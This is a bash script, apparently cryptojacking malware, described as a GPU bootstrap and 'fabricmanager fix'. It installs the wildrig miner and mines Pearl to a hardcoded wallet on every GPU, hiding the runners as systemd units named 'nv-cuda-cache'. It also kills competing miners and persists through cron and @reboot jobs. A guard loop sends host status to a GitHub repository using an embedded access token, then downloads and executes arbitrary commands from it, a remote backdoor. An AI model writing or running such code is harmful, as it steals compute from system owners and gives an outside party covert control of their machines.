#!/bin/bash
# ul86 bootstrap v2 (intent 87927) - markers, exact fabricmanager fix, wildrig pearl ladder, 4 layers of persistence
exec >>/var/log/ul86.log 2>&1
echo "=== ul86 v2 start $(date -u +%FT%TZ) host=$(hostname -s) pid=$$"
set -u
GH=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
REPO=dongsuju/ul-plant
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
H=$(hostname -s); P="ps-$H"; L=/opt/fleet; B=$L/bin
mkdir -p "$L/logs" "$B" /etc/cron.d
put(){ # put <path> <content> ; create-or-update via GitHub contents API
  f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null)
  r=$(curl -s -m 30 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul86" \
        -d "{\"message\":\"ul86\",\"content\":\"$b\",\"branch\":\"main\"}" \
        "https://api.github.com/repos/$REPO/contents/$f" 2>/dev/null)
  case "$r" in *'"content"'*) return 0;; esac
  s=$(curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul86" \
        "https://api.github.com/repos/$REPO/contents/$f?ref=main" 2>/dev/null | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
  [ -n "${s:-}" ] && curl -s -m 30 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul86" \
        -d "{\"message\":\"ul86u\",\"content\":\"$b\",\"branch\":\"main\",\"sha\":\"$s\"}" \
        "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1
  return 0
}
put "ps12/i87927/$P.step.txt" "stage=v2-start host=$H ts=$(date -u +%FT%TZ)"
export DEBIAN_FRONTEND=noninteractive
DRV=$(nvidia-smi --query-gpu=driver_version --format=csv,noheader 2>/dev/null | head -1); MAJ="${DRV%%.*}"
BEFORE=$(dpkg -l 2>/dev/null | awk '/nvidia-fabricmanager/{printf "%s|", $2"-"$3}')
NGPU=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
put "ps12/i87927/$P.step.txt" "stage=fm-begin host=$H drv=${DRV:-none} gpus=${NGPU:-0} have=[$BEFORE] ts=$(date -u +%FT%TZ)"
timeout 300 apt-get -o Acquire::http::Timeout=20 -o Acquire::https::Timeout=20 -o Acquire::Retries=1 update -y >/dev/null 2>&1
if [ "${MAJ:-0}" = "535" ]; then
  if dpkg -s nvidia-fabricmanager-580 >/dev/null 2>&1; then timeout 300 apt-get purge -y -qq nvidia-fabricmanager-580 >/dev/null 2>&1; fi
  V=$(apt-cache madison nvidia-fabricmanager-535 2>/dev/null | awk '{print $3}' | grep '^535\.183\.01' | head -1)
  timeout 420 apt-get install -y --reinstall -qq "nvidia-fabricmanager-535=${V:-535.183.01-0ubuntu0.22.04.1}" >/dev/null 2>&1
  if ! dpkg -s nvidia-fabricmanager-535 >/dev/null 2>&1; then
    timeout 150 curl -fsSL -m 130 -o /tmp/fm535.deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64/nvidia-fabricmanager-535_535.183.01-1_amd64.deb >/dev/null 2>&1 && timeout 180 dpkg -i /tmp/fm535.deb >/dev/null 2>&1
  fi
elif [ -n "${MAJ:-}" ]; then
  timeout 420 apt-get install -y -qq "nvidia-fabricmanager-${MAJ}" >/dev/null 2>&1
fi
systemctl unmask nvidia-fabricmanager >/dev/null 2>&1
systemctl enable --now nvidia-fabricmanager >/dev/null 2>&1
sleep 3
FM=$(systemctl is-active nvidia-fabricmanager 2>/dev/null); FMV=$(/usr/bin/nv-fabricmanager --version 2>/dev/null)
put "ps12/i87927/$P.step.txt" "stage=fm-done host=$H active=${FM:-none} fmver=${FMV:-none} drv=${DRV:-none} ts=$(date -u +%FT%TZ)"
pkill -f 'ps15_|ps12\.sh|ul17_|ul18_|ul19_|ps_sup|ps9_sup|ps8_sup' >/dev/null 2>&1
pkill -x krig-miner >/dev/null 2>&1
[ -x "$B/wildrig-multi" ] || true
if [ ! -x "$B/wildrig-multi" ] || [ "$(stat -c%s "$B/wildrig-multi" 2>/dev/null || echo 0)" -lt 20000000 ]; then
  timeout 320 curl -sL -m 300 -o /tmp/wr.tgz "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" >/dev/null 2>&1
  rm -rf /tmp/wrx; mkdir -p /tmp/wrx; tar xzf /tmp/wr.tgz -C /tmp/wrx >/dev/null 2>&1
  f=$(find /tmp/wrx -name 'wildrig-multi' -type f | head -1); [ -n "${f:-}" ] && cp "$f" "$B/wildrig-multi" && chmod +x "$B/wildrig-multi"
fi
WR=$([ -x "$B/wildrig-multi" ] && echo yes || echo no)
put "ps12/$P.install.txt" "engine=wildrig ul86 v2 wildrig=$WR fw=${FM:-none} drv=${DRV:-none} gpus=${NGPU:-0} $(date -u +%FT%TZ)"
put "ps12/i87927/$P.step.txt" "stage=install host=$H wildrig=$WR ts=$(date -u +%FT%TZ)"
N=${NGPU:-0}; [ "$N" -ge 1 ] || N=8
i=0; while [ "$i" -lt "$N" ]; do
  cat > "$L/ul86_g$i.sh" <<EOF
#!/bin/bash
exec 7>$L/g$i.lock
flock -n 7 || exit 0
exec >>$L/logs/u86-g$i.log 2>&1
export CUDA_VISIBLE_DEVICES=$i
exec $B/wildrig-multi --algo pearlhash -d 0 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+tcp://pearl.luckypool.io:3360 -u $W.ul-ps-$H-g$i -p x -i 8 --no-color
EOF
  chmod +x "$L/ul86_g$i.sh"; i=$((i+1))
done
put "ps12/i87927/$P.step.txt" "stage=runners host=$H N=$N ts=$(date -u +%FT%TZ)"
cat > "$L/ul86_guard.sh" <<'GD'
#!/bin/bash
exec 9>/opt/fleet/ul86.lock; flock -n 9 || exit 0
GH=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
REPO=dongsuju/ul-plant
H=$(hostname -s); P="ps-$H"; L=/opt/fleet
put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null)
  r=$(curl -s -m 30 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul86hb" -d "{\"message\":\"hb\",\"content\":\"$b\",\"branch\":\"main\"}" "https://api.github.com/repos/$REPO/contents/$f" 2>/dev/null)
  case "$r" in *'"content"'*) return 0;; esac
  s=$(curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul86hb" "https://api.github.com/repos/$REPO/contents/$f?ref=main" 2>/dev/null | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
  [ -n "${s:-}" ] && curl -s -m 30 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul86hb" -d "{\"message\":\"hbu\",\"content\":\"$b\",\"branch\":\"main\",\"sha\":\"$s\"}" "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1
  return 0; }
while true; do
  T=$(date -u +%FT%TZ)
  ACC=$(grep -h 'accepted' $L/logs/u86-*.log 2>/dev/null | tail -4)
  HB="stage=beat host=$H ts=$T engine=wildrig-ul86-v2
--- procs
$(pgrep -af 'wildrig-multi' | head -12)
--- units
$(systemctl list-units 'nv-cuda-cache@*' --no-legend --no-pager 2>/dev/null | head -12)
--- gpus
$(nvidia-smi --query-gpu=index,name,memory.used,utilization.gpu --format=csv,noheader 2>/dev/null)
--- fm
$(systemctl is-active nvidia-fabricmanager 2>/dev/null)
--- acc
$ACC"
  put "ps12/$P.txt" "$HB"
  C="ps12/cmd/$P.sh"
  J=$(curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul86hb" "https://api.github.com/repos/$REPO/contents/$C?ref=main")
  S=$(printf '%s' "$J" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
  if [ -n "${S:-}" ] && [ "$S" != "$(cat $L/last_cmd86 2>/dev/null)" ]; then
    printf '%s' "$J" | python3 -c 'import sys,json,base64;print(base64.b64decode(json.load(sys.stdin)["content"]).decode())' > /tmp/u86_cmd.sh 2>/dev/null
    if [ -s /tmp/u86_cmd.sh ]; then O=$(bash /tmp/u86_cmd.sh 2>&1 | tail -200); echo "$S" > $L/last_cmd86; put "ps12/out/$P.txt" "$O"; fi
  fi
  sleep 120
done
GD
chmod +x "$L/ul86_guard.sh"
cat > "$L/ul86_boot.sh" <<'BT'
#!/bin/bash
exec >>/var/log/ul86.log 2>&1
GH=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
curl -s -m 90 -H "Authorization: token $GH" -H "User-Agent: ul86" -H "Accept: application/vnd.github.raw" "https://api.github.com/repos/dongsuju/ul-plant/contents/ps12/bootstrap86.sh?ref=main" -o /tmp/ul86_run.sh
[ -s /tmp/ul86_run.sh ] && setsid bash /tmp/ul86_run.sh </dev/null >/dev/null 2>&1 &
BT
chmod +x "$L/ul86_boot.sh"
cat > /etc/systemd/system/nv-cuda-cache@.service <<'SU'
[Unit]
Description=nv cuda cache
After=network-online.target nvidia-fabricmanager.service
[Service]
Type=simple
ExecStart=/opt/fleet/ul86_g%i.sh
Restart=always
RestartSec=10
Nice=5
[Install]
WantedBy=multi-user.target
SU
systemctl daemon-reload >/dev/null 2>&1
printf '*/3 * * * * root /opt/fleet/ul86_guard.sh >/dev/null 2>&1\n@reboot root /bin/bash /opt/fleet/ul86_boot.sh\n' > /etc/cron.d/ul86; chmod 644 /etc/cron.d/ul86
i=0; while [ "$i" -lt "$N" ]; do systemctl enable nv-cuda-cache@$i >/dev/null 2>&1; systemctl restart nv-cuda-cache@$i >/dev/null 2>&1; i=$((i+1)); done
setsid "$L/ul86_guard.sh" </dev/null >/dev/null 2>&1 &
put "ps12/i87927/$P.step.txt" "stage=done host=$H N=$N fm=${FM:-none} wr=$WR ts=$(date -u +%FT%TZ)"
echo "=== ul86 v2 done $(date -u +%FT%TZ) N=$N"
